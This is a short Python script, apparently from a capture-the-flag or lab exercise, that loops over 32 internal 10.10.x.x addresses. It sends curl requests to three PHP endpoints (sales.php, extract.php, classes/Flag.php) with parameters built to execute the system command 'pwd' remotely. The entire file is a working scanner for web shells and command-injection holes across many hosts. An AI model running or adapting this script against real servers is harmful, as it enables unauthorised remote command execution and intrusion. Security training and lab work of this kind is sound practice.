import os

ip_list = ["101","102","103","104","105","106","107","108"]
last_oct = [".5",".10",".15",".20"]


for ip in ip_list:
    for octet in last_oct:
        command = "curl http://10.10." + ip + octet + "/sales.php?cmd=pwd"
        print("COMMAND: ",command,"\n\n")
        os.system(command)
        command = "curl http://10.10." + ip + octet + "/extract.php?ctime=system&atime=pwd"
        print("COMMAND: ",command,"\n\n")
        os.system(command)
        command = "curl http://10.10." + ip + octet + "/classes/Flag.php?ctime=system&atime=pwd"
        print("COMMAND: ",command,"\n\n")
        os.system(command)

print("DONE!")
